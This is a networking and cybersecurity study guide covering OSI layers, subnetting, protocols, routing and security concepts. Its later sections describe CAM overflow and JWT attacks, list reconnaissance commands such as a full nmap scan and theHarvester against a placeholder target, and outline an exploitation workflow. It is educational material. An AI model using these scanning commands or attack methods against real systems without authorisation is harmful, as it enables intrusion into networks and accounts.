# Networking and Cybersecurity Complete Guide

A reference document covering core networking concepts, protocols, hardware, cybersecurity, and cryptography, with interview questions and scenario-based questions.

---

# OSI Model

The OSI (Open Systems Interconnection) model is a 7-layer conceptual framework that standardizes how different network systems communicate.

#### Layer 7 - Application
Interfaces directly with end-user software. Protocols: HTTP, HTTPS, FTP, SMTP, DNS, DHCP.

#### Layer 6 - Presentation
Handles translation, encryption/decryption, and compression of data (e.g., SSL/TLS, JPEG, ASCII encoding).

#### Layer 5 - Session
Establishes, manages, and terminates sessions between two communicating hosts. Handles authentication and reconnection.

#### Layer 4 - Transport
Provides end-to-end communication, error recovery, and flow control. Protocols: TCP (reliable), UDP (fast, connectionless).

#### Layer 3 - Network
Handles logical addressing and routing of packets across networks. Protocols: IP, ICMP. Devices: Routers.

#### Layer 2 - Data Link
Handles physical addressing (MAC), framing, and error detection within the same network. Devices: Switches, Bridges. Sub-layers: LLC and MAC.

#### Layer 1 - Physical
Deals with the physical transmission of raw bits over a medium (cables, radio signals, connectors, voltages).

### Mnemonic
"Please Do Not Throw Sausage Pizza Away" (Physical, Data Link, Network, Transport, Session, Presentation, Application)

---

# TCP/IP Model

A more practical 4-layer model that the modern internet is actually built on.

#### Application Layer
Combines OSI's Application, Presentation, and Session layers. Protocols: HTTP, FTP, DNS, SMTP, Telnet, SSH.

#### Transport Layer
Same as OSI Layer 4. TCP and UDP operate here.

#### Internet Layer
Equivalent to OSI Layer 3. Handles addressing and routing (IP, ICMP, ARP).

#### Network Access (Link) Layer
Combines OSI Layers 1 and 2. Handles physical transmission and MAC addressing.

### OSI vs TCP/IP
| OSI | TCP/IP |
|---|---|
| 7 layers | 4 layers |
| Theoretical/reference model | Practical, implemented model |
| Strict layer separation | Layers combined |

---

# Bandwidth, Latency, and Throughput

#### Bandwidth
The maximum theoretical rate at which data can be transferred over a network connection, measured in bits per second (bps, Mbps, Gbps). Think of it as the width of a pipe.

#### Latency
The time delay between sending and receiving data, measured in milliseconds (ms). Caused by propagation delay, transmission delay, processing delay, and queuing delay.

#### Throughput
The actual amount of data successfully transferred over a connection in a given time. Always less than or equal to bandwidth due to overhead, congestion, and errors.

#### Jitter
Variation in latency over time, critical for real-time applications like VoIP and video calls.

### Quick Comparison
- Bandwidth = capacity of the pipe
- Throughput = actual water flowing through it
- Latency = how long it takes water to travel from one end to the other

---

# Packet Switching vs Circuit Switching

#### Circuit Switching
A dedicated communication path is established between sender and receiver for the entire session (e.g., traditional telephone networks). Resources are reserved even during idle time, guaranteeing consistent bandwidth but wasting capacity.

#### Packet Switching
Data is broken into packets, each routed independently and possibly via different paths, then reassembled at the destination. Used by the modern internet. More efficient use of bandwidth, but can suffer from variable latency and out-of-order delivery.

### Comparison
| Circuit Switching | Packet Switching |
|---|---|
| Dedicated path | Shared path, dynamic routing |
| Fixed bandwidth reserved | Bandwidth shared/used on demand |
| Low flexibility | High flexibility |
| Example: PSTN phone calls | Example: Internet, IP networks |

---

# IPv4

A 32-bit address, written in dotted decimal notation (e.g., 192.168.1.1), giving about 4.3 billion unique addresses.

#### Structure
Divided into Network portion and Host portion, determined by the subnet mask.

#### Address Classes
| Class | Range | Default Mask | Use |
|---|---|---|---|
| A | 1.0.0.0 - 126.255.255.255 | /8 | Large networks |
| B | 128.0.0.0 - 191.255.255.255 | /16 | Medium networks |
| C | 192.0.0.0 - 223.255.255.255 | /24 | Small networks |
| D | 224.0.0.0 - 239.255.255.255 | N/A | Multicast |
| E | 240.0.0.0 - 255.255.255.255 | N/A | Experimental |

#### Special Addresses
- 127.0.0.1 - Loopback
- 0.0.0.0 - Unspecified/default route
- 255.255.255.255 - Limited broadcast
- 169.254.x.x - APIPA (Automatic Private IP Addressing)

---

# IPv6

A 128-bit address written in 8 groups of hexadecimal digits separated by colons (e.g., 2001:0db8:85a3:0000:0000:8a2e:0370:7334), designed to solve IPv4 exhaustion.

#### Key Features
- Massively larger address space (~340 undecillion addresses)
- No need for NAT
- Built-in IPsec support
- Simplified header for faster routing
- Auto-configuration (SLAAC)
- No broadcast; uses multicast and anycast instead

#### Address Types
- Unicast: one-to-one
- Multicast: one-to-many
- Anycast: one-to-nearest

#### Shorthand Rules
Leading zeros in a group can be omitted, and one sequence of consecutive all-zero groups can be replaced with `::` (only once per address).

### IPv4 vs IPv6

| IPv4                                 | IPv6                                   |
| ------------------------------------ | -------------------------------------- |
| 32-bit                               | 128-bit                                |
| 8 (bits per octet) × 4 (octets) = 32 | 16 (bits per group) × 8 (groups) = 128 |
| Dotted decimal notation              | Hexadecimal colon notation             |
| NAT commonly required                | NAT generally unnecessary              |
| No native IPsec                      | IPsec built-in                         |

---

# Subnetting

Subnetting divides a large network into smaller, more manageable sub-networks (subnets) by borrowing bits from the host portion of an IP address.

#### Why Subnet

* Reduces broadcast traffic
* Improves security through segmentation
* Efficient IP address utilization
* Easier network management

#### Key Concepts

* **Subnet Mask**: Defines which bits represent the network vs the host (e.g., `255.255.255.0 = /24`).
* **CIDR Notation**: Shorthand like `/24`, `/26`, indicating the number of network bits.
* **Binary Subnetting**: Converting the subnet mask and IP to binary to calculate network address, broadcast address, and valid host range.

#### CIDR Maths

For IPv4:

* Total bits = **32**
* Network bits = **CIDR prefix**
* Host bits = **32 - CIDR prefix**

| Calculation           | Formula                     | Example `/26`                |
| --------------------- | --------------------------- | ---------------------------- |
| Network bits          | CIDR prefix                 | `26`                         |
| Host bits             | `32 - prefix`               | `32 - 26 = 6`                |
| Total IP addresses    | `2^(host bits)`             | `2^6 = 64`                   |
| Usable host addresses | `2^(host bits) - 2`         | `64 - 2 = 62`                |
| Network address       | First IP in subnet          | `192.168.1.0`                |
| Broadcast address     | Last IP in subnet           | `192.168.1.63`               |
| Usable host range     | Network + 1 → Broadcast - 1 | `192.168.1.1 - 192.168.1.62` |

> **Note:** The `-2` accounts for the **network address** and **broadcast address**. This traditional calculation applies to normal IPv4 subnets such as `/24` through `/30`. `/31` and `/32` have special uses.

#### CIDR Quick Reference

| CIDR  | Host Bits |       Total IPs |    Usable Hosts |
| ----- | --------: | --------------: | --------------: |
| `/16` |        16 | `2^16 = 65,536` |        `65,534` |
| `/17` |        15 | `2^15 = 32,768` |        `32,766` |
| `/18` |        14 | `2^14 = 16,384` |        `16,382` |
| `/19` |        13 |  `2^13 = 8,192` |         `8,190` |
| `/20` |        12 |  `2^12 = 4,096` |         `4,094` |
| `/21` |        11 |  `2^11 = 2,048` |         `2,046` |
| `/22` |        10 |  `2^10 = 1,024` |         `1,022` |
| `/23` |         9 |     `2^9 = 512` |           `510` |
| `/24` |         8 |     `2^8 = 256` |           `254` |
| `/25` |         7 |     `2^7 = 128` |           `126` |
| `/26` |         6 |      `2^6 = 64` |            `62` |
| `/27` |         5 |      `2^5 = 32` |            `30` |
| `/28` |         4 |      `2^4 = 16` |            `14` |
| `/29` |         3 |       `2^3 = 8` |             `6` |
| `/30` |         2 |       `2^2 = 4` |             `2` |
| `/31` |         1 |       `2^1 = 2` | Point-to-point* |
| `/32` |         0 |       `2^0 = 1` | Single address* |

* `/31` is commonly used for point-to-point links, where both addresses can be used. `/32` represents a single IPv4 address.

#### Example

Given `192.168.1.0/26`:

**Step 1 — Find host bits**

```text
Host bits = 32 - 26
          = 6
```

**Step 2 — Calculate total IP addresses**

```text
Total IPs = 2^6
          = 64
```

**Step 3 — Calculate usable hosts**

```text
Usable hosts = 2^6 - 2
             = 64 - 2
             = 62
```

**Step 4 — Calculate subnet increment**

The subnet mask for `/26` is `255.255.255.192`.

```text
Increment = 256 - 192
          = 64
```

Therefore, the subnets are:

```text
192.168.1.0/26
192.168.1.64/26
192.168.1.128/26
192.168.1.192/26
```

For `192.168.1.0/26`:

```text
Network   = 192.168.1.0
First host = 192.168.1.1
Last host  = 192.168.1.62
Broadcast = 192.168.1.63
```

#### Formulae

| Requirement        | Formula                        |
| ------------------ | ------------------------------ |
| IPv4 total bits    | `32`                           |
| Host bits          | `32 - CIDR prefix`             |
| Network bits       | `CIDR prefix`                  |
| Total IP addresses | `2^(host bits)`                |
| Usable IPv4 hosts  | `2^(host bits) - 2`            |
| Subnet increment   | `256 - subnet mask value`      |
| Number of subnets  | `2^(borrowed bits)`            |
| Borrowed bits      | `New prefix - Original prefix` |

#### Number of Subnets Example

Given a `/24` network split into `/26`:

```text
Borrowed bits = 26 - 24
              = 2
```

```text
Number of subnets = 2^2
                  = 4
```

Each `/26` subnet contains:

```text
Host bits = 32 - 26
          = 6

Total IPs = 2^6
          = 64

Usable hosts = 64 - 2
             = 62
```

So:

| Original Network | New CIDR | Borrowed Bits | Number of Subnets | IPs per Subnet | Usable Hosts |
| ---------------- | -------: | ------------: | ----------------: | -------------: | -----------: |
| `/24`            |    `/26` |           `2` |         `2^2 = 4` |     `2^6 = 64` |         `62` |

#### VLSM (Variable Length Subnet Masking)

Allows subnets of different sizes within the same network, optimizing address allocation instead of using one fixed mask everywhere.

For example, a `/24` network can be divided into `/26`, `/27`, and `/28` subnets depending on the number of hosts required.

---

# Private vs Public IP Addresses

#### Private IP
Used within internal networks (LAN); not routable on the public internet.

Private ranges (RFC 1918):
- 10.0.0.0 - 10.255.255.255 (/8)
- 172.16.0.0 - 172.31.255.255 (/12)
- 192.168.0.0 - 192.168.255.255 (/16)

#### Public IP
Globally unique and routable on the internet, assigned by ISPs or regional internet registries (ARIN, RIPE, APNIC).

---

# NAT and PAT

#### NAT (Network Address Translation)
Translates private IP addresses to a public IP address (and vice versa) so internal devices can communicate with the internet using a shared public address.

**Types of NAT:**
- Static NAT: One-to-one fixed mapping
- Dynamic NAT: Maps private IPs to a pool of public IPs
- PAT (overload): Many-to-one mapping using port numbers

#### PAT (Port Address Translation)
A form of dynamic NAT that maps multiple private IP addresses to a single public IP address, differentiating sessions using unique source port numbers. Also called "NAT Overload." This is what most home routers use.

---

# Protocols

A **network protocol** is a set of rules that defines how devices communicate and exchange data over a network. Protocols specify things such as **how data is formatted, addressed, transmitted, received, acknowledged, and secured**.

Different protocols operate at different layers of the networking stack and serve different purposes. For example, **TCP** provides reliable data delivery, **DNS** resolves domain names to IP addresses, **HTTP/HTTPS** transfers web content, and **ARP** maps IP addresses to MAC addresses on a local network.

#### TCP (Transmission Control Protocol)

TCP is a **connection-oriented and reliable transport-layer protocol**. It establishes a connection between two devices before transmitting application data and ensures that data arrives **reliably, in order, and without duplication**.

TCP achieves reliability using:

* **Sequence numbers** — identify the position of data in the byte stream.
* **Acknowledgments (ACKs)** — confirm that data was received.
* **Retransmission** — resends data if it is lost.
* **Checksum** — detects corrupted data.
* **Flow control** — prevents a sender from overwhelming the receiver.
* **Congestion control** — adjusts transmission speed based on network conditions.

**Three-Way Handshake:**

1. **SYN** — client requests a connection.
2. **SYN-ACK** — server acknowledges the request and responds.
3. **ACK** — client confirms; the connection is established.

**Four-Way Termination:**

1. **FIN** — one side requests to close its connection.
2. **ACK** — other side acknowledges.
3. **FIN** — other side closes its connection.
4. **ACK** — final acknowledgment.

**Common uses:**

* HTTP/HTTPS
* SSH
* FTP
* SMTP
* IMAP

TCP is preferred when **reliable and ordered delivery** is more important than minimum latency.

#### UDP (User Datagram Protocol)

UDP is a **connectionless transport-layer protocol**. Unlike TCP, it does not establish a connection or guarantee that packets will arrive.

UDP provides:

* No connection establishment
* No delivery guarantee
* No ordering guarantee
* No retransmission
* Low protocol overhead
* Low latency

The application sends **datagrams** without waiting for acknowledgments from the receiver.

Because UDP does not spend time establishing connections, acknowledging packets, or retransmitting lost data, it is useful for applications where **speed and low latency are more important than perfect delivery**.

**Common uses:**

* DNS
* DHCP
* VoIP
* Live video/audio streaming
* Online gaming

For example, losing one video frame during a live stream may be preferable to waiting for retransmission and causing additional delay.

#### TCP vs UDP

| TCP                           | UDP                                 |
| ----------------------------- | ----------------------------------- |
| Connection-oriented           | Connectionless                      |
| Reliable delivery             | No delivery guarantee               |
| Ordered delivery              | No ordering guarantee               |
| Uses acknowledgments          | No acknowledgments                  |
| Retransmits lost data         | Does not retransmit                 |
| Higher overhead               | Lower overhead                      |
| Generally higher latency      | Generally lower latency             |
| Flow and congestion control   | No built-in flow/congestion control |
| Best when reliability matters | Best when speed/latency matters     |

#### HTTP (Hypertext Transfer Protocol)

HTTP is an **application-layer protocol** used to transfer web resources between clients and servers.

A typical HTTP communication works like this:

```text
Client → HTTP Request → Web Server
Client ← HTTP Response ← Web Server
```

An HTTP request can contain:

* **Method** — such as `GET`, `POST`, `PUT`, or `DELETE`.
* **URL/path** — identifies the requested resource.
* **Headers** — provide additional information.
* **Body** — carries data when required.

The server responds with:

* **Status code** — such as `200`, `404`, or `500`.
* **Headers**
* **Response body**

**Common port:** `80`

HTTP itself does not provide encryption. For secure web communication, **HTTPS** is used.

**Common uses:**

* Websites
* Web APIs
* REST APIs
* Communication between web browsers and servers

#### HTTPS (HTTP Secure)

HTTPS is HTTP transmitted over **TLS (Transport Layer Security)**.

It provides:

* **Encryption** — protects data from being read in transit.
* **Authentication** — helps verify that the client is communicating with the intended server.
* **Integrity** — helps detect tampering with transmitted data.

**Common port:** `443`

A simplified connection looks like:

```text
Client
  ↓
TLS handshake
  ↓
Encrypted HTTP communication
  ↓
Web Server
```

HTTPS is used for websites, APIs, login pages, online banking, e-commerce, and other applications where data should be protected.

#### DNS (Domain Name System)

DNS translates **domain names into IP addresses** so that clients can locate servers.

For example:

```text
www.example.com
       ↓
DNS lookup
       ↓
93.184.216.34
```

Without DNS, users would generally need to remember IP addresses instead of domain names.

DNS commonly uses:

* **UDP port 53** for normal queries.
* **TCP port 53** for cases such as larger responses and DNS zone transfers.

Common DNS record types include:

| Record  | Purpose                                                       |
| ------- | ------------------------------------------------------------- |
| `A`     | Maps a domain to an IPv4 address                              |
| `AAAA`  | Maps a domain to an IPv6 address                              |
| `CNAME` | Alias for another domain name                                 |
| `MX`    | Specifies mail servers                                        |
| `NS`    | Specifies authoritative name servers                          |
| `TXT`   | Stores text information, often used for verification/security |

**Example:**

```text
example.com
     ↓
DNS Resolver
     ↓
DNS Server
     ↓
192.0.2.10
```

#### DHCP (Dynamic Host Configuration Protocol)

DHCP automatically provides network configuration to devices when they join a network.

A DHCP server can provide:

* IP address
* Subnet mask
* Default gateway
* DNS server
* Lease duration

The typical DHCP process is called **DORA**:

1. **Discover** — client broadcasts a request for a DHCP server.
2. **Offer** — DHCP server offers an IP configuration.
3. **Request** — client requests the offered configuration.
4. **ACK** — server confirms the assignment.

**Ports:**

* DHCP server: `UDP 67`
* DHCP client: `UDP 68`

Without DHCP, devices would need to be manually configured with network settings.

#### FTP (File Transfer Protocol)

FTP is an application-layer protocol used to **transfer files between a client and a server**.

FTP supports operations such as:

* Uploading files
* Downloading files
* Listing directories
* Creating directories
* Renaming files
* Deleting files

**Control connection:** `TCP 21`

Traditional FTP does **not encrypt credentials or file contents**, making it unsuitable for sensitive communication over untrusted networks.

#### SFTP (SSH File Transfer Protocol)

SFTP provides secure file transfer through **SSH**.

It encrypts:

* Authentication credentials
* Commands
* File contents
* Directory information

**Common port:** `TCP 22`

SFTP should not be confused with **FTPS**, which is FTP secured using TLS. SFTP is a separate protocol that operates through SSH.

#### SSH (Secure Shell)

SSH is a secure protocol used for **remote login, command execution, and secure file transfer**.

It encrypts communication between the client and server.

**Common port:** `TCP 22`

Common SSH uses include:

* Remote server administration
* Running commands remotely
* Secure file transfer
* Port forwarding/tunneling
* Git operations over SSH

Example:

```text
Administrator
     ↓
   SSH
     ↓
Remote Server
     ↓
Execute commands securely
```

SSH can authenticate users using passwords or, preferably in many administrative environments, **public-key authentication**.

#### Telnet

Telnet is an older protocol for **remote command-line access**.

**Common port:** `TCP 23`

Unlike SSH, Telnet does **not encrypt the communication**. Usernames, passwords, commands, and other transmitted data can potentially be observed by an attacker who can capture the traffic.

Therefore:

```text
Telnet → Unencrypted → Insecure
SSH    → Encrypted   → Secure alternative
```

Telnet is largely deprecated for remote administration and is generally replaced by SSH.

#### SMTP (Simple Mail Transfer Protocol)

SMTP is used primarily for **sending and relaying email**.

A simplified email flow is:

```text
Email Client
     ↓
SMTP Server
     ↓
Sender Mail Server
     ↓
Recipient Mail Server
```

Common SMTP ports include:

|  Port | Common use                                    |
| ----: | --------------------------------------------- |
|  `25` | Server-to-server mail transfer                |
| `587` | Mail submission, commonly with authentication |
| `465` | SMTP over implicit TLS in common deployments  |

SMTP is primarily a **mail sending/transfer protocol**. It does not normally provide the mechanism used by an email client to retrieve messages from a mailbox.

#### POP3 (Post Office Protocol version 3)

POP3 is an email retrieval protocol used by clients to **download messages from a mail server**.

**Common ports:**

* `110` — POP3
* `995` — POP3 over TLS

POP3 traditionally focuses on downloading messages to the client and can be configured to remove messages from the server after download.

It is useful for simpler email access but provides less flexible synchronization than IMAP.

#### IMAP (Internet Message Access Protocol)

IMAP is an email retrieval and synchronization protocol.

Unlike traditional POP3 usage, IMAP keeps messages on the server and allows clients to synchronize:

* Emails
* Folders
* Read/unread status
* Flags
* Message state

**Common ports:**

* `143` — IMAP
* `993` — IMAP over TLS

IMAP is generally better suited to users who access the same mailbox from **multiple devices**.

#### ICMP (Internet Control Message Protocol)

ICMP is a network-layer control and diagnostic protocol used by IP networks.

It is **not a transport protocol like TCP or UDP**.

ICMP is commonly used for:

* Error reporting
* Network diagnostics
* Reachability testing
* Path troubleshooting

**Ping** uses ICMP Echo Request and Echo Reply messages.

```text
Host A
  │
  │ ICMP Echo Request
  ↓
Host B
  │
  │ ICMP Echo Reply
  ↓
Host A
```

Tools such as `ping` use ICMP to determine whether a destination is reachable and measure round-trip time.

`traceroute`/`tracert` can also use ICMP messages, depending on the operating system and implementation.

#### ARP (Address Resolution Protocol)

ARP is used on IPv4 local networks to determine the **MAC address associated with an IPv4 address**.

For example:

```text
IPv4 address: 192.168.1.20
        ↓
      ARP
        ↓
MAC address: AA:BB:CC:DD:EE:FF
```

A device can send an ARP request asking:

```text
Who has 192.168.1.20?
```

The device owning that IP address responds with its MAC address.

ARP operates within the **local Layer 2 network/broadcast domain**.

> IPv6 does not use ARP. IPv6 uses **Neighbor Discovery Protocol (NDP)** instead.

#### SNMP (Simple Network Management Protocol)

SNMP is used to **monitor and manage network devices** such as:

* Routers
* Switches
* Firewalls
* Servers
* Printers
* Access points

SNMP can provide information such as:

* CPU utilization
* Memory usage
* Interface status
* Interface traffic
* Device uptime
* Error counters

**Common ports:**

* `UDP 161` — SNMP queries/operations
* `UDP 162` — SNMP traps/notifications

A monitoring system can periodically query devices:

```text
Network Monitoring Server
          ↓
       SNMP Query
          ↓
Router / Switch
          ↓
     SNMP Response
          ↓
Network Monitoring Server
```

SNMP versions differ in security capabilities. **SNMPv3** provides significantly stronger security features than older versions.

#### NTP (Network Time Protocol)

NTP synchronizes the clocks of networked devices.

**Common port:** `UDP 123`

Accurate time is important for:

* Log correlation
* Security investigations
* Authentication systems
* Certificates
* Distributed applications
* Scheduled tasks

A simplified NTP hierarchy is:

```text
Reference Time Source
        ↓
   NTP Server
        ↓
 Routers / Servers
        ↓
 Client Devices
```

NTP allows devices to maintain clocks that are closely synchronized with a common time source.

#### Protocol Summary

| Protocol | Purpose                         |     Common Port |
| -------- | ------------------------------- | --------------: |
| TCP      | Reliable transport              |         Various |
| UDP      | Fast connectionless transport   |         Various |
| HTTP     | Web communication               |          TCP 80 |
| HTTPS    | Secure web communication        |         TCP 443 |
| DNS      | Domain name resolution          |      UDP/TCP 53 |
| DHCP     | Automatic IP configuration      |       UDP 67/68 |
| FTP      | File transfer                   |          TCP 21 |
| SFTP     | Secure file transfer over SSH   |          TCP 22 |
| SSH      | Secure remote access            |          TCP 22 |
| Telnet   | Unencrypted remote access       |          TCP 23 |
| SMTP     | Sending/relaying email          |  TCP 25/465/587 |
| POP3     | Email retrieval                 |     TCP 110/995 |
| IMAP     | Email retrieval/synchronization |     TCP 143/993 |
| ICMP     | Diagnostics and network control | No TCP/UDP port |
| ARP      | IPv4-to-MAC resolution          | No TCP/UDP port |
| SNMP     | Network monitoring/management   |     UDP 161/162 |
| NTP      | Time synchronization            |         UDP 123 |

---

# Switches and Routers

#### Switch
A Layer 2 device that connects devices within the same LAN, forwarding frames based on MAC addresses. Learns MAC addresses via the CAM table and forwards traffic intelligently, unlike a hub which broadcasts to all ports.

**Layer 3 Switch**: Adds routing capability, can perform both switching and basic inter-VLAN routing.

#### Router
A Layer 3 device that connects different networks and forwards packets based on IP addresses, using a routing table to determine the best path.

### Switch vs Router
| Switch | Router |
|---|---|
| Layer 2 (some Layer 3) | Layer 3 |
| Connects devices within a LAN | Connects different networks |
| Uses MAC addresses | Uses IP addresses |
| Uses CAM table | Uses routing table |

---

# MAC Address

A 48-bit (6-byte) physical address burned into a network interface card (NIC), written in hexadecimal (e.g., 00:1A:2B:3C:4D:5E).

#### Structure
- First 24 bits (OUI - Organizationally Unique Identifier): Identifies the manufacturer.
- Last 24 bits: Unique identifier assigned by the manufacturer.

#### Key Points
- Operates at Layer 2 (Data Link)
- Unique globally (in theory)
- Can be spoofed via software
- Unlike IP addresses, MAC addresses don't change when a device moves networks

---

# CAM Table

The Content Addressable Memory (CAM) table is used by switches to map MAC addresses to physical switch ports.

#### How It Works
1. Switch receives a frame and inspects the source MAC address.
2. It records that MAC-to-port mapping in the CAM table.
3. For the destination, it checks the CAM table; if found, forwards only to that port; if not found, floods the frame to all ports except the incoming one.

#### CAM Table Overflow Attack
An attacker floods a switch with fake MAC addresses to exhaust CAM table memory, forcing it to flood all traffic to every port (acting like a hub), enabling packet sniffing. Mitigated with port security.

---

# Routing and Routing Protocols

#### Routing
The process of selecting a path for traffic to travel across networks, performed by routers using a routing table containing destination networks, next-hop addresses, and metrics.

#### Static Routing
Manually configured routes. Simple, predictable, but doesn't adapt to network changes and doesn't scale well.

#### Dynamic Routing
Routers automatically learn and share routes using routing protocols, adapting to topology changes.

#### Interior Gateway Protocols (IGP) - within an autonomous system
- **RIP (Routing Information Protocol)**: Distance-vector, uses hop count (max 15 hops), simple but slow to converge.
- **OSPF (Open Shortest Path First)**: Link-state protocol, uses cost based on bandwidth, fast convergence, widely used in enterprises.
- **EIGRP (Enhanced Interior Gateway Routing Protocol)**: Cisco-proprietary (now partially open), hybrid distance-vector, fast convergence.

#### Exterior Gateway Protocol
- **BGP (Border Gateway Protocol)**: Path-vector protocol used between autonomous systems; the protocol that runs the internet's backbone routing.

#### Routing Metrics
Values used to determine the best path, such as hop count, bandwidth, delay, load, and reliability.

#### Administrative Distance
A value indicating the trustworthiness of a routing source; lower is more preferred (e.g., directly connected = 0, static = 1, OSPF = 110, RIP = 120).

---

# VLAN (Virtual LAN)

Logically segments a single physical switch into multiple isolated broadcast domains, improving security and reducing broadcast traffic without needing separate physical switches.

#### Trunking
A trunk link carries traffic for multiple VLANs between switches, typically tagged using the 802.1Q standard.

#### Inter-VLAN Routing
Required for devices in different VLANs to communicate, done via a Layer 3 switch or a router-on-a-stick setup.

---

# Spanning Tree Protocol (STP)

Prevents Layer 2 loops in networks with redundant switch links by blocking backup paths until needed, avoiding broadcast storms. Elects a root bridge and calculates the shortest path to it from every switch.

---

# Additional Core Networking Concepts

#### Ports and Sockets
A port is a logical endpoint (0-65535) identifying a specific process or service on a device. A socket is the combination of an IP address and a port number, uniquely identifying a communication endpoint.

Well-known ports (0-1023): HTTP(80), HTTPS(443), FTP(21), SSH(22), DNS(53), SMTP(25).

#### MTU (Maximum Transmission Unit)
The largest packet size (in bytes) that can be transmitted over a network segment without fragmentation, typically 1500 bytes for Ethernet.

#### DNS Resolution Process
1. Browser checks local cache
2. Query sent to recursive resolver (usually ISP)
3. Resolver queries root server
4. Root refers to TLD server (.com, .org)
5. TLD refers to authoritative name server
6. Authoritative server returns the IP address

#### DHCP Process (DORA)
1. Discover - client broadcasts to find a DHCP server
2. Offer - server offers an IP address
3. Request - client requests the offered IP
4. Acknowledge - server confirms the lease

#### Proxy Server
Acts as an intermediary between client and server, used for caching, filtering content, hiding client IPs, and access control.

#### Load Balancer
Distributes incoming traffic across multiple servers to improve availability, reliability, and performance.

#### Network Topologies
Bus, Star, Ring, Mesh, Hybrid - describe the physical or logical arrangement of network devices.

#### QoS (Quality of Service)
Prioritizes certain types of traffic (e.g., VoIP, video) over others to ensure performance for critical applications.

#### Wireless Standards
- WEP - old, insecure
- WPA/WPA2 - improved security, AES encryption in WPA2
- WPA3 - current standard, stronger encryption and protection against brute-force attacks

---

# Cybersecurity Fundamentals

#### Core Risk Vocabulary
- **Vulnerability**: A weakness that could be exploited (e.g., unpatched software).
- **Threat**: A potential cause of an unwanted incident (e.g., an attacker, malware).
- **Risk**: The likelihood and impact of a threat exploiting a vulnerability.
- **Exploit**: The actual method/code used to take advantage of a vulnerability.

#### Principle of Least Privilege
Users and systems should be granted only the minimum access necessary to perform their function, limiting damage from compromised accounts.

#### CIA Triad
- **Confidentiality**: Ensuring only authorized users can access data (encryption, access controls).
- **Integrity**: Ensuring data isn't altered or tampered with (hashing, checksums).
- **Availability**: Ensuring systems and data are accessible when needed (redundancy, DDoS protection).

#### AAA Framework
- **Authentication**: Verifying identity (passwords, biometrics, MFA)
- **Authorization**: Granting appropriate access/permissions
- **Accounting**: Logging and tracking user activity

#### Defense in Depth
A layered security approach using multiple overlapping controls (firewalls, IDS/IPS, endpoint protection, physical security) so that if one layer fails, others still protect the system.

#### Zero Trust
A security model based on "never trust, always verify" - no user or device is trusted by default, even inside the network perimeter; continuous verification is required.

---

# Access Control Models

- **DAC (Discretionary Access Control)**: Resource owner decides who gets access.
- **MAC (Mandatory Access Control)**: Access governed by fixed system-wide policy/labels (e.g., government/military systems).
- **RBAC (Role-Based Access Control)**: Access granted based on job role.
- **ABAC (Attribute-Based Access Control)**: Access decisions based on attributes (user, resource, environment).

---

# Authentication Standards

- **MFA (Multi-Factor Authentication)**: Combines something you know (password), have (token/phone), and are (biometrics).
- **SSO (Single Sign-On)**: One login grants access to multiple systems.
- **OAuth 2.0**: Authorization framework allowing third-party apps limited access without sharing credentials.
- **SAML**: XML-based standard for exchanging authentication/authorization data, common in enterprise SSO.
- **Kerberos**: Ticket-based network authentication protocol using a trusted third party (KDC), widely used in Active Directory.

---

# JWT (JSON Web Token)

A compact, self-contained token format used for authentication and information exchange, structured in three Base64URL-encoded parts separated by dots: `Header.Payload.Signature`.

#### Structure
- **Header**: Specifies the token type and signing algorithm (e.g., HS256, RS256).
- **Payload**: Contains claims (user data, expiry, issuer, etc.). Not encrypted, only encoded — never store secrets here.
- **Signature**: Verifies the token hasn't been tampered with, created by signing the header+payload with a secret (HMAC) or private key (RSA/ECDSA).

#### How It Works
1. User authenticates; server issues a signed JWT.
2. Client stores the JWT (e.g., in memory, localStorage, or a cookie) and sends it with each request (commonly `Authorization: Bearer <token>`).
3. Server verifies the signature and claims on each request — no server-side session lookup needed.

#### JWT vs Session Tokens
| JWT | Session Token |
|---|---|
| Stateless, self-contained | Stateful, server stores session data |
| Server doesn't need to store token | Requires session store (DB/Redis) |
| Harder to revoke before expiry | Easy to revoke (delete session) |
| Scales well across servers | Needs shared session store to scale |

#### Common Vulnerabilities
- **alg:none attack**: Attacker sets algorithm to "none" and strips the signature; poorly implemented verifiers accept it.
- **Algorithm confusion**: Tricking an RS256 verifier into treating the public key as an HMAC secret.
- **Weak secret**: Brute-forcing a short/guessable HMAC signing secret.
- **No expiry validation**: Tokens accepted indefinitely if `exp` isn't checked.
- **Sensitive data in payload**: Payload is only encoded, not encrypted — readable by anyone with the token.

---

# Cookies and Sessions

#### Cookies
Small key-value pairs stored by the browser and sent automatically with requests to the issuing domain.

Key attributes:
- **Secure**: Only sent over HTTPS.
- **HttpOnly**: Inaccessible to JavaScript, mitigates XSS-based theft.
- **SameSite**: Controls cross-site sending (`Strict`, `Lax`, `None`) — mitigates CSRF.
- **Domain/Path**: Scopes which requests include the cookie.
- **Expires/Max-Age**: Controls cookie lifetime.

#### Sessions
Server-side state tied to a client via a session ID stored in a cookie.

```text
Login → Server creates session (stored server-side) → Session ID sent as cookie
     → Client sends cookie on each request → Server looks up session
```

#### Cookie/Session-Based Auth vs Token-Based (JWT) Auth
| Cookie/Session | JWT |
|---|---|
| Server stores session state | Stateless, self-contained |
| Revocation is immediate | Revocation requires extra mechanism (blocklist, short expiry) |
| Vulnerable to CSRF (mitigate with SameSite/CSRF tokens) | Not inherently CSRF-vulnerable if not stored in cookies |
| Vulnerable to session hijacking if ID leaked | Vulnerable to token theft if leaked (e.g., via XSS) |

---

# Reconnaissance

The information-gathering phase of an attack (or a pentest), typically split into passive and active recon.

#### Passive Recon
Gathering information without directly interacting with the target's systems.
- OSINT (WHOIS lookups, DNS records, social media, job postings, GitHub leaks)
- Search engine dorking (Google dorks)
- Certificate transparency logs (crt.sh) for subdomain discovery

#### Active Recon
Directly interacting with the target's infrastructure — noisier, more detectable.
- Port scanning (`nmap`)
- Service/version detection and OS fingerprinting
- DNS zone transfers, subdomain brute-forcing
- Banner grabbing

**Common tools:**
```bash
nmap -sV -sC -p- target.com        # full port scan with version/script detection
whois target.com
dig target.com ANY
theharvester -d target.com -b all
```

#### Enumeration
Follows recon; actively extracting detailed information from discovered services (users, shares, running software versions) to identify attack surface.

---

# Exploitation

The phase where an attacker leverages a discovered vulnerability to gain unauthorized access or execute code.

#### Exploit Types
- **Remote Code Execution (RCE)**: Executing arbitrary code on a target system remotely.
- **Local Privilege Escalation (LPE)**: Elevating privileges after initial access is gained.
- **Public exploits**: Pre-written exploit code (Metasploit modules, Exploit-DB) for known CVEs.
- **Custom/0-day exploits**: Exploits for vulnerabilities with no public patch or disclosure.

#### Typical Exploitation Workflow
```text
Recon → Identify vulnerable service/version
     → Find/develop exploit
     → Gain initial access (shell, RCE)
     → Post-exploitation (privilege escalation, persistence, lateral movement)
```

